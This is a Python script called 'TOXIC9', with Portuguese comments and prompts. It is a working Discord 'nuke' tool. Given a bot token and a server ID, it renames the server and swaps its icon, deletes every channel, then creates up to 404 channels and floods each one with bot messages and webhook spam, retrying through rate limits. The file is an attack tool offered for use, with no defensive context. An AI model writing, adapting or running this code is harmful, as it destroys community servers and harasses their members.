import asyncio
import aiohttp
import os
import sys
import base64
import ctypes
from colorama import Fore, Style, init

# Configurações da Janela (Windows Only)
def setup_window():
    if os.name == 'nt':
        # Define o título
        ctypes.windll.kernel32.SetConsoleTitleW("TOXIC9 - BY FAK & CCL ON TOP")
        
        # Define o tamanho fixo (Largura, Altura)
        os.system('mode con: cols=65 lines=25')
        
        # Trava o redimensionamento e remove botões extras
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        style = ctypes.windll.user32.GetWindowLongW(hwnd, -16)
        # Remove bordas redimensionáveis e botões de maximizar
        style = style & ~0x00040000 & ~0x00010000 
        ctypes.windll.user32.SetWindowLongW(hwnd, -16, style)

init(autoreset=True)

P, W, R, G = Fore.MAGENTA + Style.BRIGHT, Fore.WHITE + Style.BRIGHT, Fore.RED + Style.BRIGHT, Fore.GREEN + Style.BRIGHT
semaphore = asyncio.Semaphore(25) 

def limpar():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_headers(token):
    return {
        "Authorization": f"Bot {token}",
        "Content-Type": "application/json"
    }

def banner():
    limpar()
    print(f"""{P}      ████████╗ ██████╗ ██╗  ██╗██╗ ██████╗  █████╗ 
{P}      ╚══██╔══╝██╔═══██╗╚██╗██╔╝██║██╔════╝ ██╔══██╗
{P}         ██║   ██║   ██║ ╚███╔╝ ██║██║      ╚██████║
{P}         ██║   ██║   ██║ ██╔██╗ ██║██║       ╚═══██║
{P}         ██║   ╚██████╔╝██╔╝ ██╗██║╚██████╗ █████╔╝
{P}         ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝ ╚═════╝ ╚════╝ 
{W}    ═══════════════════════════════════════════════════
{W}    [ {P}TOXIC9 {W}] - {W}BY: {P}FAK & CCL ON TOP {W}| {W}MODE: {P} NUKE ALL
{W}    ═══════════════════════════════════════════════════
    """)

async def send_bot_msg(session, token, ch_id, message):
    headers = get_headers(token)
    for _ in range(7): 
        try:
            await session.post(f"https://discord.com/api/v10/channels/{ch_id}/messages", 
                               headers=headers, json={"content": message})
            await asyncio.sleep(0.2) 
        except: break

async def send_webhook_spam(session, webhook_url, message):
    payload = {"content": message, "username": "TOXIC9 | CCL ON TOP"}
    for _ in range(404): 
        try:
            async with session.post(webhook_url, json=payload) as r:
                if r.status == 429:
                    data = await r.json()
                    await asyncio.sleep(data.get('retry_after', 1))
                elif r.status not in [200, 204]:
                    break
        except: break

async def create_node(session, token, g_id, ch_name, msg_content, strike_tasks):
    headers = get_headers(token)
    async with semaphore:
        try:
            async with session.post(f"https://discord.com/api/v10/guilds/{g_id}/channels", 
                                    headers=headers, json={"name": ch_name, "type": 0}) as r:
                if r.status == 201:
                    channel = await r.json()
                    c_id = channel['id']
                    print(f"{P} [+] {W}NODE: {c_id}")
                    strike_tasks.append(asyncio.create_task(send_bot_msg(session, token, c_id, msg_content)))
                    await asyncio.sleep(0.4)
                    async with session.post(f"https://discord.com/api/v10/channels/{c_id}/webhooks", 
                                            headers=headers, json={"name": "TOXIC9-STRIKE"}) as wr:
                        if wr.status == 201:
                            wd = await wr.json()
                            strike_tasks.append(asyncio.create_task(send_webhook_spam(session, wd['url'], msg_content)))
                elif r.status == 429:
                    d = await r.json()
                    await asyncio.sleep(d.get('retry_after', 5))
        except: pass

async def update_server(session, token, g_id, srv_name, icon_path):
    headers = get_headers(token)
    payload = {"name": srv_name}
    if icon_path and os.path.exists(icon_path):
        try:
            with open(icon_path, "rb") as img:
                b64 = base64.b64encode(img.read()).decode('utf-8')
                payload["icon"] = f"data:image/png;base64,{b64}"
        except: pass
    await session.patch(f"https://discord.com/api/v10/guilds/{g_id}", headers=headers, json=payload)

async def run_protocol(token, target, ch_name, msg_content, srv_name, icon_path):
    async with aiohttp.ClientSession() as session:
        headers = get_headers(token)
        strike_tasks = []
        await update_server(session, token, target, srv_name, icon_path)
        async with session.get(f"https://discord.com/api/v10/guilds/{target}/channels", headers=headers) as r:
            if r.status == 200:
                channels = await r.json()
                print(f"{R} [*] {W}Limpando essa porra")
                tasks = [session.delete(f"https://discord.com/api/v10/channels/{c['id']}", headers=headers) for c in channels]
                await asyncio.gather(*tasks)

        print(f"{P} [*] {W}Injetando a maldade")
        channel_tasks = [create_node(session, token, target, ch_name, msg_content, strike_tasks) for _ in range(404)]
        await asyncio.gather(*channel_tasks)

        if strike_tasks:
            print(f"{G} [*] {W}Gerando baguncinha")
            await asyncio.gather(*strike_tasks)

async def main():
    setup_window() # Aplica as travas de janela
    banner()
    t = input(f"{P} [?] {W}Token Bot   > ")
    g = input(f"{P} [>] {W}Server ID     > ")
    
    print(f"\n{W} --- CONFIGURAÇÕES ---")
    s_name = input(f"{P} [?] {W}Server name > ")
    i_path = input(f"{P} [?] {W}Link do icone > ") 
    c_name = input(f"{P} [?] {W}Nome dos canais > ")
    m_cont = input(f"{P} [?] {W}Assinatura > ")
    
    banner()
    print(f"{P} [*] {W}Inicializando protocolo ")
    await run_protocol(t, g, c_name, m_cont, s_name, i_path)
    print(f"\n{G} [OK] {W}NUKED BY PANEL TOXIC9 | CCL ON TOP"); await asyncio.sleep(3)

if __name__ == "__main__":
    try: asyncio.run(main())
    except KeyboardInterrupt: sys.exit()
